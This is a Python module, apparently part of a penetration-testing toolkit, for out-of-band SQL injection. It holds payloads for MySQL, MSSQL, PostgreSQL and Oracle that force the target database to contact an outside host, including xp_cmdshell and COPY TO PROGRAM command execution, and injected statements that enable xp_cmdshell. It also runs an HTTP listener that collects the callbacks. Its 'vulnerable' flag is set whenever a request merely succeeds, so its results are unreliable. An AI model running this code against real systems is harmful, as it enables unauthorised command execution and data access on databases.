import threading, json, time
from typing import Optional, Dict
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests

from tools.log_utils import get_logger

logger = get_logger("sqli_oob")

OOB_PAYLOADS = {
    "mysql_dns": "LOAD_FILE('\\\\%s\\file')",
    "mysql_unc": "SELECT LOAD_FILE('\\\\%s\\test')",
    "mssql_xp_cmdshell": "EXEC xp_cmdshell 'ping %s'",
    "mssql_sp_oacreate": "DECLARE @o INT; EXEC sp_oacreate 'wscript.shell',@o OUT; EXEC sp_oamethod @o,'run','ping %s',0",
    "mssql_openrowset": "SELECT * FROM OPENROWSET('SQLOLEDB','%s';'sa';'password','SELECT 1')",
    "mssql_bulk_insert": "BULK INSERT test FROM '\\\\%s\\file'",
    "postgres_copy": "COPY (SELECT 1) TO PROGRAM 'ping %s'",
    "postgres_dblink": "SELECT dblink_connect('host=%s')",
    "postgres_lo_export": "SELECT lo_export(1,'\\\\%s\\file')",
    "oracle_utl_http": "SELECT UTL_HTTP.request('http://%s/test') FROM dual",
    "oracle_utl_inaddr": "SELECT UTL_INADDR.get_host_name('%s') FROM dual",
    "oracle_utl_smtp": "SELECT UTL_SMTP.open_connection('%s',25) FROM dual",
    "oracle_dbms_ldap": "SELECT DBMS_LDAP.init('%s',389) FROM dual",
}


class OOBHandler(BaseHTTPRequestHandler):
    callbacks = []
    lock = threading.Lock()

    def do_GET(self):
        with OOBHandler.lock:
            OOBHandler.callbacks.append({
                "path": self.path,
                "client": self.client_address,
                "time": time.time(),
            })
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, fmt, *args):
        pass


class OOBListener:
    def __init__(self, port: int = 9999):
        self.port = port
        self.server = None
        self.thread = None
        self.running = False

    def start(self):
        if self.running:
            return
        OOBHandler.callbacks = []
        self.server = HTTPServer(("0.0.0.0", self.port), OOBHandler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.running = True

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.running = False

    def get_callbacks(self) -> list:
        with OOBHandler.lock:
            return list(OOBHandler.callbacks)


class SQLiOOB:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
        self.sess = sess or requests.Session()
        self.timeout = timeout
        self.oob_listener = None

    def test_all(self, url: str, param: str, oob_domain: str) -> Dict:
        result = {"vulnerable": False, "findings": []}
        for payload_type, tpl in OOB_PAYLOADS.items():
            payload = tpl % oob_domain
            try:
                sep = "&" if "?" in url else "?"
                self.sess.get("%s%s%s=%s" % (url, sep, param, payload),
                              timeout=self.timeout, verify=False)
                result["findings"].append({"type": payload_type, "payload": payload[:50]})
                result["vulnerable"] = True
            except Exception as e:
                logger.debug("oob test %s: %s", payload_type, e)
        return result

    def test_xp_cmdshell(self, url: str, param: str, oob_domain: str) -> Dict:
        result = {"vulnerable": False, "findings": []}
        enable_cmds = [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
        ]
        for cmd in enable_cmds:
            try:
                sep = "&" if "?" in url else "?"
                self.sess.get("%s%s%s=%s" % (url, sep, param, cmd),
                              timeout=self.timeout, verify=False)
                result["findings"].append({"cmd": cmd[:40]})
            except Exception as e:
                logger.debug("xp enable: %s", e)
        test_payload = OOB_PAYLOADS["mssql_xp_cmdshell"] % oob_domain
        try:
            sep = "&" if "?" in url else "?"
            self.sess.get("%s%s%s=%s" % (url, sep, param, test_payload),
                          timeout=self.timeout, verify=False)
            result["vulnerable"] = True
            result["findings"].append({"xp_cmdshell": test_payload[:40]})
        except Exception as e:
            logger.debug("xp cmdshell: %s", e)
        return result

    def start_listener(self, port: int = 9999) -> None:
        self.oob_listener = OOBListener(port)
        self.oob_listener.start()

    def stop_listener(self) -> None:
        if self.oob_listener:
            self.oob_listener.stop()

    def get_callbacks(self) -> list:
        if self.oob_listener:
            return self.oob_listener.get_callbacks()
        return []


def check(url: str, param: str, oob_domain: str = "oob.local",
          sess: Optional[requests.Session] = None, timeout: float = 10.0) -> Dict:
    oob = SQLiOOB(sess, timeout)
    return oob.test_all(url, param, oob_domain)
